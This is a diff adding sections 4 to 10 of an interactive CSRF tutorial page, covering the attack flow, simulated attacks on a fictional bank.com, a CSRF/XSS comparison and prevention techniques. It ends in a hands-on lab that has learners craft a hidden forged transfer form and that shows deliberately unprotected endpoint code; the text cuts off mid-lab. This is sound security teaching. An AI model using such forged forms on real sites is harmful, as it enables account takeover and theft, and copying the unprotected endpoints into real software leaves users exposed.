+</div>
+
+<!-- SECTION 4: WHAT IS CSRF -->
+<div class="section" id="section-4">
+  <div class="sec-head">
+    <div class="sec-num">04 / 10</div>
+    <div><div class="sec-title">What is CSRF?</div><div class="sec-desc">Cross-Site Request Forgery explained simply</div></div>
+  </div>
+
+  <div class="callout">
+    <strong>CSRF</strong> (Cross-Site Request Forgery) happens when an attacker tricks your browser into sending a request to a site where you're already logged in — <em>without your knowledge or intention</em>.
+  </div>
+
+  <div class="card">
+    <div class="card-label lbl-cyan">THE THREE-WORD DEFINITION</div>
+    <div style="display:flex;gap:20px;align-items:stretch;flex-wrap:wrap;margin:10px 0;">
+      <div style="flex:1;min-width:130px;padding:16px;background:var(--bg4);border-radius:8px;border:1px solid var(--border);text-align:center;">
+        <div style="font-size:28px;margin-bottom:6px;">🔀</div>
+        <div style="font-family:var(--mono);font-size:10px;color:var(--cyan);margin-bottom:4px;">CROSS-SITE</div>
+        <div style="font-size:13px;color:var(--text2);">The attack comes from a different website (evil.com) targeting another (bank.com)</div>
+      </div>
+      <div style="flex:1;min-width:130px;padding:16px;background:var(--bg4);border-radius:8px;border:1px solid var(--border);text-align:center;">
+        <div style="font-size:28px;margin-bottom:6px;">📤</div>
+        <div style="font-family:var(--mono);font-size:10px;color:var(--cyan);margin-bottom:4px;">REQUEST</div>
+        <div style="font-size:13px;color:var(--text2);">An HTTP request (GET or POST) is made to the target site — not just JavaScript execution</div>
+      </div>
+      <div style="flex:1;min-width:130px;padding:16px;background:var(--bg4);border-radius:8px;border:1px solid var(--border);text-align:center;">
+        <div style="font-size:28px;margin-bottom:6px;">🎭</div>
+        <div style="font-family:var(--mono);font-size:10px;color:var(--cyan);margin-bottom:4px;">FORGERY</div>
+        <div style="font-size:13px;color:var(--text2);">The request is forged — it appears to come from the legitimate user, but was made without their intent</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="split">
+    <div class="card card-green">
+      <div class="card-label lbl-green">SIMPLE ANALOGY</div>
+      <p style="font-size:14px;margin-bottom:12px;">Imagine someone forges your signature on a check while you're asleep. The bank sees a valid signature and processes it — they never asked if you signed it willingly.</p>
+      <div style="padding:12px;background:var(--bg);border-radius:6px;font-size:13px;color:var(--text2);">
+        <div>🏦 Bank = Web Server</div>
+        <div>✍️ Signature = Session Cookie</div>
+        <div>😴 Asleep = You don't know it happened</div>
+        <div>🕵️ Forger = Attacker</div>
+      </div>
+    </div>
+    <div class="card card-amber">
+      <div class="card-label lbl-amber">WHAT CSRF IS NOT</div>
+      <ul class="cklist" style="--cyan:var(--amber);">
+        <li>Not about stealing passwords</li>
+        <li>Not JavaScript injection (that's XSS)</li>
+        <li>Not about reading data (attacker is blind)</li>
+        <li>Not about breaking encryption</li>
+        <li>About abusing browser trust</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="nav-btns">
+    <button class="btn" onclick="prevSection(4)">← Core Problem</button>
+    <button class="btn btn-primary" onclick="nextSection(4)">Next: Attack Flow →</button>
+  </div>
+</div>
+
+<!-- SECTION 5: ATTACK FLOW -->
+<div class="section" id="section-5">
+  <div class="sec-head">
+    <div class="sec-num">05 / 10</div>
+    <div><div class="sec-title">CSRF Attack Flow</div><div class="sec-desc">Step-by-step interactive diagram</div></div>
+  </div>
+
+  <div class="callout">
+    The CSRF attack happens silently across two browser tabs or two sites. Click each step to walk through the complete attack chain.
+  </div>
+
+  <div class="card">
+    <div class="card-label lbl-cyan">INTERACTIVE FLOW — CLICK EACH STEP</div>
+    <div class="steps">
+      <div class="step-item done-step" id="f0"><div class="step-dot">1</div><div class="step-lbl">Login</div></div>
+      <div class="step-item" id="f1"><div class="step-dot">2</div><div class="step-lbl">Cookie Stored</div></div>
+      <div class="step-item" id="f2"><div class="step-dot">3</div><div class="step-lbl">Visit Evil Site</div></div>
+      <div class="step-item" id="f3"><div class="step-dot">4</div><div class="step-lbl">Trigger Fired</div></div>
+      <div class="step-item" id="f4"><div class="step-dot">5</div><div class="step-lbl">Cookie Sent</div></div>
+      <div class="step-item" id="f5"><div class="step-dot">6</div><div class="step-lbl">Attack Succeeds</div></div>
+    </div>
+
+    <div id="flowDisplay" class="card" style="background:var(--bg);border:1px solid var(--border2);min-height:160px;margin-top:0;">
+      <div id="flowContent">
+        <div style="font-family:var(--mono);font-size:11px;color:var(--text3);margin-bottom:8px;">STEP 1 / 6 — USER LOGS IN</div>
+        <div class="split">
+          <div>
+            <div class="browser" style="margin-bottom:8px;">
+              <div class="browser-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><div class="burl secure">bank.com/login</div></div>
+              <div class="browser-body" style="padding:12px;font-size:13px;">Alice enters username + password on bank.com</div>
+            </div>
+          </div>
+          <div>
+            <div class="term">
+              <div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--text3);margin-left:6px;">server response</span></div>
+              <div class="term-body" style="font-size:11px;"><span class="tok">200 OK</span><br><span class="tk">Set-Cookie:</span> <span class="tv">session=abc123;</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="btn-row">
+      <button class="btn" onclick="flowStep(0)">Step 1</button>
+      <button class="btn" onclick="flowStep(1)">Step 2</button>
+      <button class="btn" onclick="flowStep(2)">Step 3</button>
+      <button class="btn btn-red" onclick="flowStep(3)">Step 4</button>
+      <button class="btn btn-red" onclick="flowStep(4)">Step 5</button>
+      <button class="btn btn-red" onclick="flowStep(5)">Step 6 — Attack!</button>
+    </div>
+  </div>
+
+  <div class="card card-red">
+    <div class="card-label lbl-red">THE COMPLETE PICTURE</div>
+    <div class="flow-nodes" style="flex-wrap:wrap;gap:8px;">
+      <div class="fn safe-node" style="font-size:12px;">alice logs in<br><span style="font-size:10px;">bank.com</span></div>
+      <div class="farrow">→</div>
+      <div class="fn active-node" style="font-size:12px;">cookie stored<br><span style="font-size:10px;">browser</span></div>
+      <div class="farrow">→</div>
+      <div class="fn" style="font-size:12px;">visits evil.com<br><span style="font-size:10px;">different tab</span></div>
+      <div class="farrow danger">→</div>
+      <div class="fn danger-node" style="font-size:12px;">attack triggers<br><span style="font-size:10px;">invisible form</span></div>
+      <div class="farrow danger">→</div>
+      <div class="fn danger-node" style="font-size:12px;">cookie auto-sent<br><span style="font-size:10px;">to bank.com</span></div>
+      <div class="farrow danger">→</div>
+      <div class="fn danger-node" style="font-size:12px;">server accepts<br><span style="font-size:10px;">attack done!</span></div>
+    </div>
+  </div>
+
+  <div class="nav-btns">
+    <button class="btn" onclick="prevSection(5)">← What is CSRF</button>
+    <button class="btn btn-primary" onclick="nextSection(5)">Next: Live Simulation →</button>
+  </div>
+</div>
+
+<!-- SECTION 6: LIVE SIMULATION -->
+<div class="section" id="section-6">
+  <div class="sec-head">
+    <div class="sec-num">06 / 10</div>
+    <div><div class="sec-title">Live Attack Simulation</div><div class="sec-desc">Watch a CSRF attack happen in real time</div></div>
+  </div>
+
+  <div class="callout callout-red">
+    This simulation shows three real attack scenarios. Click a scenario, then watch the attacker's page silently submit a forged request.
+  </div>
+
+  <!-- SCENARIO SELECTOR -->
+  <div class="scenario-card" id="sc-pass" onclick="selectScenario('pass')">
+    <div style="display:flex;justify-content:space-between;align-items:center;">
+      <div><div class="sc-title">🔐 Change Password</div><div class="sc-desc">Attacker changes victim's password without them knowing</div></div>
+      <div class="badge b-red">HIGH IMPACT</div>
+    </div>
+  </div>
+  <div class="scenario-card" id="sc-transfer" onclick="selectScenario('transfer')">
+    <div style="display:flex;justify-content:space-between;align-items:center;">
+      <div><div class="sc-title">💸 Transfer Money</div><div class="sc-desc">Attacker triggers bank transfer to their account</div></div>
+      <div class="badge b-red">CRITICAL</div>
+    </div>
+  </div>
+  <div class="scenario-card" id="sc-email" onclick="selectScenario('email')">
+    <div style="display:flex;justify-content:space-between;align-items:center;">
+      <div><div class="sc-title">📧 Change Email</div><div class="sc-desc">Attacker changes account email → takes over account</div></div>
+      <div class="badge b-amber">MEDIUM</div>
+    </div>
+  </div>
+
+  <div id="scenarioSim" style="display:none;" class="card card-red">
+    <div class="split">
+      <div>
+        <div class="card-label lbl-cyan" style="margin-bottom:10px;">ALICE'S BROWSER (victim)</div>
+        <div class="browser" style="margin-bottom:10px;">
+          <div class="browser-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><div class="burl danger" id="simBankUrl">bank.com</div></div>
+          <div class="browser-body" id="simBankBody" style="font-size:13px;">Alice is logged in and browsing bank.com normally.</div>
+        </div>
+        <div class="browser" style="border-color:rgba(244,63,94,0.4);">
+          <div class="browser-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><div class="burl danger">evil-cats.com</div></div>
+          <div class="browser-body" id="simEvilBody" style="font-size:13px;color:var(--text2);">Alice visits a cat photo site. Looks innocent...</div>
+        </div>
+      </div>
+      <div>
+        <div class="card-label lbl-red" style="margin-bottom:10px;">ATTACK CODE (hidden on evil site)</div>
+        <div class="term">
+          <div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--text3);margin-left:6px;">evil-cats.com page source</span></div>
+          <div class="term-body" style="font-size:11px;" id="simAttackCode">
+            <div class="tc">— select a scenario —</div>
+          </div>
+        </div>
+        <div class="card-label lbl-red" style="margin-top:12px;margin-bottom:8px;">REQUEST SENT TO BANK</div>
+        <div id="simRequestSent" class="req-panel" style="display:none;">
+          <div class="req-header" style="color:var(--red);">FORGED HTTP REQUEST</div>
+          <div class="req-body" id="simReqBody" style="font-size:11px;"></div>
+        </div>
+        <div id="simResult" style="display:none;" class="attack-result atk-success" style="margin-top:10px;"></div>
+      </div>
+    </div>
+    <div class="btn-row">
+      <button class="btn btn-red" onclick="runSimulation()">▶ Launch CSRF Attack</button>
+      <button class="btn" onclick="resetSim()">Reset</button>
+    </div>
+  </div>
+
+  <div class="nav-btns">
+    <button class="btn" onclick="prevSection(6)">← Attack Flow</button>
+    <button class="btn btn-primary" onclick="nextSection(6)">Next: Conditions →</button>
+  </div>
+</div>
+
+<!-- SECTION 7: CONDITIONS -->
+<div class="section" id="section-7">
+  <div class="sec-head">
+    <div class="sec-num">07 / 10</div>
+    <div><div class="sec-title">Conditions Required for CSRF</div><div class="sec-desc">All four must be true for the attack to work</div></div>
+  </div>
+
+  <div class="callout">
+    CSRF only works when all four conditions are present. Toggle each condition to see how removing one breaks the attack.
+  </div>
+
+  <div class="card">
+    <div class="card-label lbl-cyan">INTERACTIVE CONDITIONS</div>
+
+    <div class="cond-toggle on" id="cond0" onclick="toggleCond(0)">
+      <div><div class="cond-label">🔐 User is logged in (has valid session)</div><div style="font-size:12px;color:var(--text3);margin-top:2px;">Browser holds an active session cookie for bank.com</div></div>
+      <div class="cond-status" id="cs0">ENABLED</div>
+    </div>
+    <div class="cond-toggle on" id="cond1" onclick="toggleCond(1)">
+      <div><div class="cond-label">🔄 Sensitive action modifies data</div><div style="font-size:12px;color:var(--text3);margin-top:2px;">Target action has real impact: transfer, update, delete</div></div>
+      <div class="cond-status" id="cs1">ENABLED</div>
+    </div>
+    <div class="cond-toggle on" id="cond2" onclick="toggleCond(2)">
+      <div><div class="cond-label">🍪 Authentication relies on cookies</div><div style="font-size:12px;color:var(--text3);margin-top:2px;">Server identifies users via session cookie in HTTP headers</div></div>
+      <div class="cond-status" id="cs2">ENABLED</div>
+    </div>
+    <div class="cond-toggle on" id="cond3" onclick="toggleCond(3)">
+      <div><div class="cond-label">🚫 No CSRF protection on the endpoint</div><div style="font-size:12px;color:var(--text3);margin-top:2px;">Endpoint doesn't check for CSRF token or validate origin</div></div>
+      <div class="cond-status" id="cs3">ENABLED</div>
+    </div>
+
+    <div id="condResult" class="attack-result atk-success" style="margin-top:14px;">
+      ⚠ ALL CONDITIONS MET — CSRF ATTACK WILL SUCCEED
+    </div>
+  </div>
+
+  <!-- ATTACKER MINDSET -->
+  <div style="margin-top:20px;">
+    <div style="font-family:var(--mono);font-size:10px;color:var(--text3);letter-spacing:0.1em;margin-bottom:14px;">ATTACKER MINDSET</div>
+    <div class="mindset-item">
+      <div style="font-size:18px;flex-shrink:0;margin-top:2px;">🔍</div>
+      <div><div class="mi-q">"Is the target user logged in?"</div><div class="mi-a">Is there a session that will be active when my victim visits my site? Banking, social media, email — users stay logged in for hours.</div></div>
+    </div>
+    <div class="mindset-item">
+      <div style="font-size:18px;flex-shrink:0;margin-top:2px;">🍪</div>
+      <div><div class="mi-q">"Will the browser automatically send cookies?"</div><div class="mi-a">Yes — unless SameSite cookie protection is in place. Older sites without SameSite are vulnerable.</div></div>
+    </div>
+    <div class="mindset-item">
+      <div style="font-size:18px;flex-shrink:0;margin-top:2px;">⚡</div>
+      <div><div class="mi-q">"Can I trigger a cross-site request?"</div><div class="mi-a">Forms, images, iframes, and links all trigger HTTP requests. I just need to get the victim to load my page.</div></div>
+    </div>
+    <div class="mindset-item">
+      <div style="font-size:18px;flex-shrink:0;margin-top:2px;">🛡</div>
+      <div><div class="mi-q">"Is there CSRF protection?"</div><div class="mi-a">Does the form include a hidden token? Is the token validated server-side? Many older applications skip this.</div></div>
+    </div>
+  </div>
+
+  <div class="nav-btns">
+    <button class="btn" onclick="prevSection(7)">← Live Simulation</button>
+    <button class="btn btn-primary" onclick="nextSection(7)">Next: CSRF vs XSS →</button>
+  </div>
+</div>
+
+<!-- SECTION 8: CSRF VS XSS -->
+<div class="section" id="section-8">
+  <div class="sec-head">
+    <div class="sec-num">08 / 10</div>
+    <div><div class="sec-title">CSRF vs XSS</div><div class="sec-desc">Two different attacks, often confused</div></div>
+  </div>
+
+  <div class="callout">
+    CSRF and XSS are often mentioned together, but they are fundamentally different attacks. Understanding the distinction is crucial.
+  </div>
+
+  <div class="card">
+    <div class="card-label lbl-cyan">SIDE-BY-SIDE COMPARISON</div>
+    <table class="cmp-table">
+      <thead><tr><th>ASPECT</th><th style="color:var(--red);">CSRF</th><th style="color:var(--indigo);">XSS</th></tr></thead>
+      <tbody>
+        <tr>
+          <td style="color:var(--text2);">What it does</td>
+          <td>Makes unwanted requests on user's behalf</td>
+          <td>Executes malicious scripts in browser</td>
+        </tr>
+        <tr>
+          <td style="color:var(--text2);">JavaScript needed?</td>
+          <td><span class="badge b-green">No — pure HTML form works</span></td>
+          <td><span class="badge b-red">Yes — requires script injection</span></td>
+        </tr>
+        <tr>
+          <td style="color:var(--text2);">Can read response?</td>
+          <td><span class="badge b-red">No — attacker is blind</span></td>
+          <td><span class="badge b-amber">Yes — full DOM access</span></td>
+        </tr>
+        <tr>
+          <td style="color:var(--text2);">Exploits</td>
+          <td>Browser's automatic cookie sending</td>
+          <td>Server's failure to sanitize input</td>
+        </tr>
+        <tr>
+          <td style="color:var(--text2);">Origin</td>
+          <td>Attack comes from different site</td>
+          <td>Attack injected into target site</td>
+        </tr>
+        <tr>
+          <td style="color:var(--text2);">User must be logged in?</td>
+          <td><span class="badge b-red">Yes — needs valid session</span></td>
+          <td><span class="badge b-cyan">Not necessarily</span></td>
+        </tr>
+        <tr>
+          <td style="color:var(--text2);">Primary defense</td>
+          <td>CSRF tokens, SameSite cookies</td>
+          <td>Input sanitization, CSP</td>
+        </tr>
+        <tr>
+          <td style="color:var(--text2);">Can steal cookies?</td>
+          <td><span class="badge b-green">No — can't read responses</span></td>
+          <td><span class="badge b-red">Yes — document.cookie</span></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="split">
+    <div class="card card-red">
+      <div class="card-label lbl-red">CSRF IN ONE SENTENCE</div>
+      <p style="font-size:15px;">"Your browser does something <em>you didn't ask it to do</em>, using credentials it already has."</p>
+    </div>
+    <div class="card card-indigo">
+      <div class="card-label lbl-indigo">XSS IN ONE SENTENCE</div>
+      <p style="font-size:15px;">"Malicious code runs <em>inside</em> a trusted website, as if it were part of the site."</p>
+    </div>
+  </div>
+
+  <div class="card card-amber">
+    <div class="card-label lbl-amber">COMBINED ATTACK (THE WORST CASE)</div>
+    <p style="font-size:14px;margin-bottom:10px;">When an attacker has XSS on a site, they can also bypass CSRF protection — because they can read the CSRF token from the DOM and include it in their forged requests.</p>
+    <div class="flow-nodes" style="flex-wrap:wrap;gap:6px;">
+      <div class="fn" style="font-size:12px;">XSS injected</div>
+      <div class="farrow danger">→</div>
+      <div class="fn danger-node" style="font-size:12px;">Script reads CSRF token</div>
+      <div class="farrow danger">→</div>
+      <div class="fn danger-node" style="font-size:12px;">Includes token in forged request</div>
+      <div class="farrow danger">→</div>
+      <div class="fn danger-node" style="font-size:12px;">CSRF protection bypassed!</div>
+    </div>
+  </div>
+
+  <div class="nav-btns">
+    <button class="btn" onclick="prevSection(8)">← Conditions</button>
+    <button class="btn btn-primary" onclick="nextSection(8)">Next: Prevention →</button>
+  </div>
+</div>
+
+<!-- SECTION 9: PREVENTION -->
+<div class="section" id="section-9">
+  <div class="sec-head">
+    <div class="sec-num">09 / 10</div>
+    <div><div class="sec-title">Prevention Techniques</div><div class="sec-desc">How to stop CSRF at every layer</div></div>
+  </div>
+
+  <div class="callout callout-green">
+    <strong>Core principle:</strong> Prove the request came from your page, not from an attacker's page. A CSRF token is a secret that only your page knows.
+  </div>
+
+  <div class="tabs" id="s9tabs">
+    <div class="tab active" onclick="s9tab(0)">CSRF Tokens</div>
+    <div class="tab" onclick="s9tab(1)">SameSite Cookies</div>
+    <div class="tab" onclick="s9tab(2)">Origin Check</div>
+    <div class="tab" onclick="s9tab(3)">Common Mistakes</div>
+  </div>
+
+  <!-- CSRF TOKENS -->
+  <div class="tab-panel active" id="s9p0">
+    <div class="card">
+      <div class="card-label lbl-cyan">HOW CSRF TOKENS WORK</div>
+      <div class="split">
+        <div>
+          <p style="font-size:14px;color:var(--text2);margin-bottom:12px;">When the server serves a form, it embeds a random secret token. When the form is submitted, the token must be present and valid. An attacker's page cannot know this token.</p>
+          <div class="term">
+            <div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--text3);margin-left:6px;">protected form HTML</span></div>
+            <div class="term-body" style="font-size:11px;">
+              <div>&lt;<span class="tk">form</span> action=<span class="ts">"/transfer"</span> method=<span class="ts">"POST"</span>&gt;</div>
+              <div>&nbsp;&lt;<span class="tk">input</span> name=<span class="ts">"amount"</span> value=<span class="ts">"100"</span>&gt;</div>
+              <div>&nbsp;&lt;<span class="tk">input</span> type=<span class="ts">"hidden"</span></div>
+              <div>&nbsp;&nbsp;name=<span class="ts">"csrf_token"</span></div>
+              <div>&nbsp;&nbsp;value=<span class="tv" id="tokenDisplay">"xK9mP2..."</span>&gt;</div>
+              <div>&lt;/<span class="tk">form</span>&gt;</div>
+            </div>
+          </div>
+        </div>
+        <div>
+          <div class="card-label lbl-cyan" style="margin-bottom:10px;">TOKEN VALIDATION DEMO</div>
+          <div class="lbl">SIMULATE REQUEST TYPE</div>
+          <select id="tokenType" style="margin-bottom:10px;">
+            <option value="legit">Legitimate request (from bank.com form)</option>
+            <option value="csrf_no">CSRF attack — no token</option>
+            <option value="csrf_wrong">CSRF attack — wrong token</option>
+            <option value="csrf_expired">CSRF attack — expired token</option>
+          </select>
+          <button class="btn btn-primary" style="width:100%;margin-bottom:12px;" onclick="checkToken()">▶ Validate Request</button>
+          <div id="tokenResult" style="display:none;" class="attack-result"></div>
+          <div class="card-label lbl-cyan" style="margin-top:14px;">SERVER LOGIC</div>
+          <div class="term">
+            <div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div></div>
+            <div class="term-body" style="font-size:11px;">
+              <div class="tc">// Server validates every sensitive request</div>
+              <div><span class="tk">if</span> (req.body.<span class="tv">csrf_token</span> === session.<span class="tv">csrf_token</span>) {</div>
+              <div>&nbsp;&nbsp;<span class="tc">// proceed</span></div>
+              <div>} <span class="tk">else</span> { <span class="td2">reject(403 Forbidden)</span> }</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SAMESITE -->
+  <div class="tab-panel" id="s9p1">
+    <div class="card">
+      <div class="card-label lbl-cyan">SAMESITE COOKIE ATTRIBUTE</div>
+      <p style="font-size:14px;color:var(--text2);margin-bottom:14px;">The <code style="color:var(--cyan);">SameSite</code> attribute tells the browser when to attach cookies to cross-site requests. It's the simplest modern defense against CSRF.</p>
+      <div class="grid3">
+        <div style="padding:14px;background:var(--bg);border-radius:8px;border:1px solid rgba(244,63,94,0.25);">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--red);margin-bottom:8px;">SameSite=None</div>
+          <div style="font-size:13px;color:var(--text2);">Cookie sent in ALL cross-site requests. This is the old default — CSRF is possible.</div>
+          <div class="badge b-red" style="margin-top:8px;">VULNERABLE</div>
+        </div>
+        <div style="padding:14px;background:var(--bg);border-radius:8px;border:1px solid rgba(245,158,11,0.25);">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--amber);margin-bottom:8px;">SameSite=Lax</div>
+          <div style="font-size:13px;color:var(--text2);">Cookie sent for top-level navigations (link clicks) but not for images, iframes, forms. The modern default.</div>
+          <div class="badge b-amber" style="margin-top:8px;">PARTIAL PROTECTION</div>
+        </div>
+        <div style="padding:14px;background:var(--bg);border-radius:8px;border:1px solid rgba(16,185,129,0.25);">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--green);margin-bottom:8px;">SameSite=Strict</div>
+          <div style="font-size:13px;color:var(--text2);">Cookie NEVER sent in cross-site requests. The strongest protection — but may break some OAuth flows.</div>
+          <div class="badge b-green" style="margin-top:8px;">BEST PROTECTION</div>
+        </div>
+      </div>
+      <div class="term" style="margin-top:16px;">
+        <div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--text3);margin-left:6px;">secure cookie configuration</span></div>
+        <div class="term-body" style="font-size:11px;">
+          <div><span class="tk">Set-Cookie:</span> <span class="tv">session=abc123;</span> <span class="ts">SameSite=Strict;</span> <span class="ts">HttpOnly;</span> <span class="ts">Secure</span></div>
+          <div class="tc" style="margin-top:6px;">// This single line prevents most CSRF attacks</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ORIGIN CHECK -->
+  <div class="tab-panel" id="s9p2">
+    <div class="card">
+      <div class="card-label lbl-cyan">ORIGIN / REFERER VALIDATION</div>
+      <p style="font-size:14px;color:var(--text2);margin-bottom:14px;">The server can check the <code style="color:var(--cyan);">Origin</code> or <code style="color:var(--cyan);">Referer</code> header to verify the request came from the expected domain.</p>
+      <div class="term">
+        <div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--text3);margin-left:6px;">server-side validation logic</span></div>
+        <div class="term-body" style="font-size:11px;">
+          <div class="tc">// Check Origin header on all state-changing requests</div>
+          <div><span class="tk">const</span> origin = req.headers[<span class="ts">'origin'</span>];</div>
+          <div><span class="tk">const</span> allowed = [<span class="ts">'https://bank.com'</span>];</div>
+          <div style="margin-top:6px;"><span class="tk">if</span> (!allowed.includes(origin)) {</div>
+          <div>&nbsp;&nbsp;<span class="td2">return res.status(403).send('Forbidden')</span>;</div>
+          <div>}</div>
+          <div class="tc" style="margin-top:6px;">// Origin cannot be spoofed by simple cross-site requests</div>
+        </div>
+      </div>
+      <div class="callout callout-amber" style="margin-top:14px;font-size:13px;">
+        <strong>Limitation:</strong> Referer can be stripped by privacy tools or HTTPS→HTTP redirects. Always use CSRF tokens as the primary defense, with Origin check as a secondary layer.
+      </div>
+    </div>
+  </div>
+
+  <!-- COMMON MISTAKES -->
+  <div class="tab-panel" id="s9p3">
+    <div class="card card-red">
+      <div class="card-label lbl-red">COMMON CSRF PROTECTION MISTAKES</div>
+      <div class="grid3">
+        <div style="padding:14px;background:var(--bg);border-radius:8px;border:1px solid var(--border);">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--red);margin-bottom:6px;">MISTAKE 1</div>
+          <div style="font-weight:600;margin-bottom:4px;">Token not validated server-side</div>
+          <div style="font-size:13px;color:var(--text2);">Token exists in the form but the server never checks it. The check is missing or commented out.</div>
+        </div>
+        <div style="padding:14px;background:var(--bg);border-radius:8px;border:1px solid var(--border);">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--red);margin-bottom:6px;">MISTAKE 2</div>
+          <div style="font-weight:600;margin-bottom:4px;">Same token for all users</div>
+          <div style="font-size:13px;color:var(--text2);">Using a global static token instead of per-session random tokens. Once leaked, protects nobody.</div>
+        </div>
+        <div style="padding:14px;background:var(--bg);border-radius:8px;border:1px solid var(--border);">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--red);margin-bottom:6px;">MISTAKE 3</div>
+          <div style="font-weight:600;margin-bottom:4px;">Token in URL parameter</div>
+          <div style="font-size:13px;color:var(--text2);">Token in the URL leaks via Referer headers and browser history. Always use POST body or headers.</div>
+        </div>
+        <div style="padding:14px;background:var(--bg);border-radius:8px;border:1px solid var(--border);">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--red);margin-bottom:6px;">MISTAKE 4</div>
+          <div style="font-weight:600;margin-bottom:4px;">Only protecting POST, not GET</div>
+          <div style="font-size:13px;color:var(--text2);">State-changing GET requests are just as vulnerable. CSRF isn't just about POST forms.</div>
+        </div>
+        <div style="padding:14px;background:var(--bg);border-radius:8px;border:1px solid var(--border);">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--red);margin-bottom:6px;">MISTAKE 5</div>
+          <div style="font-weight:600;margin-bottom:4px;">Token not tied to session</div>
+          <div style="font-size:13px;color:var(--text2);">Token generated but not linked to user's session. Any valid token works for any user.</div>
+        </div>
+        <div style="padding:14px;background:var(--bg);border-radius:8px;border:1px solid var(--border);">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--red);margin-bottom:6px;">MISTAKE 6</div>
+          <div style="font-weight:600;margin-bottom:4px;">Missing SameSite attribute</div>
+          <div style="font-size:13px;color:var(--text2);">Not setting SameSite on cookies means browsers will send them on cross-site requests by default.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="nav-btns">
+    <button class="btn" onclick="prevSection(9)">← CSRF vs XSS</button>
+    <button class="btn btn-primary" onclick="nextSection(9)">Next: Final Lab →</button>
+  </div>
+</div>
+
+<!-- SECTION 10: FINAL LAB -->
+<div class="section" id="section-10">
+  <div class="sec-head">
+    <div class="sec-num">10 / 10</div>
+    <div><div class="sec-title">Final Hands-on Lab</div><div class="sec-desc">Apply everything you've learned</div></div>
+  </div>
+
+  <div class="callout callout-amber">
+    Complete all 4 tasks to demonstrate your understanding of CSRF — from executing an attack to enabling protection.
+  </div>
+
+  <div class="prog-bar"><div class="prog-fill" id="labProg" style="width:0%;"></div></div>
+  <div style="font-family:var(--mono);font-size:11px;color:var(--text3);margin-bottom:24px;" id="labProgText">0 / 4 tasks completed</div>
+
+  <!-- TASK 1: Perform CSRF -->
+  <div class="lab-task" id="ltask1">
+    <div class="lt-num" id="ln1">01</div>
+    <div style="flex:1;">
+      <div class="lt-title">Perform a CSRF Attack</div>
+      <div class="lt-hint">The bank below has no CSRF protection. Craft a hidden form that transfers money to the attacker account. Target: POST /transfer with amount=5000 and to=attacker.</div>
+      <div style="margin-top:14px;" class="split">
+        <div>
+          <div class="lbl">ATTACKER'S HIDDEN FORM CODE</div>
+          <textarea id="lt1input" style="height:100px;font-size:11px;" placeholder='&lt;form action="https://bank.com/transfer" method="POST"&gt;&#10;  &lt;input type="hidden" name="amount" value="???"&gt;&#10;  &lt;input type="hidden" name="to" value="???"&gt;&#10;&lt;/form&gt;'></textarea>
+          <button class="btn btn-red" style="margin-top:8px;" onclick="submitLT1()">▶ Launch Attack</button>
+          <div id="lr1" style="margin-top:8px;font-family:var(--mono);font-size:11px;"></div>
+        </div>
+        <div>
+          <div class="lbl">VULNERABLE BANK ENDPOINT</div>
+          <div class="req-panel">
+            <div class="req-header">POST /transfer (no CSRF token!)</div>
+            <div class="req-body" style="font-size:11px;">
+              <div class="tc">Accepts: amount, to</div>
+              <div class="tc">Auth: session cookie only</div>
+              <div class="tc">CSRF token: ❌ not required</div>
+              <div style="margin-top:8px;color:var(--red);">// This is the vulnerability</div>
+            </div>
+          </div>
+          <div id="lt1bankState" class="session-store" style="margin-top:8px;">
+            <div class="session-entry"><span class="se-key">alice balance:</span><span class="se-val" id="lt1balance">$10,000</span></div>
+            <div class="session-entry"><span class="se-key">attacker balance:</span><span class="se-val" id="lt1attacker">$0</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TASK 2: Identify Missing Protection -->
+  <div class="lab-task" id="ltask2">
+    <div class="lt-num" id="ln2">02</div>
+    <div style="flex:1;">
+      <div class="lt-title">Identify Missing Protection</div>
+      <div class="lt-hint">Look at this login form code and identify ALL security issues that make it CSRF-vulnerable.</div>
+      <div style="margin-top:12px;">
+        <div class="term">
+          <div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--text3);margin-left:6px;">vulnerable form</span></div>
+          <div class="term-body" style="font-size:11px;">
+            <div>&lt;<span class="tk">form</span> action=<span class="ts">"/change-email"</span> method=<span class="ts">"POST"</span>&gt;</div>
+            <div>&nbsp;&lt;<span class="tk">input</span> name=<span class="ts">"email"</span> type=<span class="ts">"text"</span>&gt;</div>
+            <div>&nbsp;&lt;<span class="tk">button</span>&gt;Update Email&lt;/<span class="tk">button</span>&gt;</div>
+            <div>&lt;/<span class="tk">form</span>&gt;</div>
+            <div style="margin-top:8px;" class="tc">// Server code:</div>
+            <div>app.post(<span class="ts">'/change-email'</span>, (req, res) =&gt; {</div>
+            <div>&nbsp;&nbsp;db.update({ email: req.body.email }); <span class="tc">// trusts input</span></div>
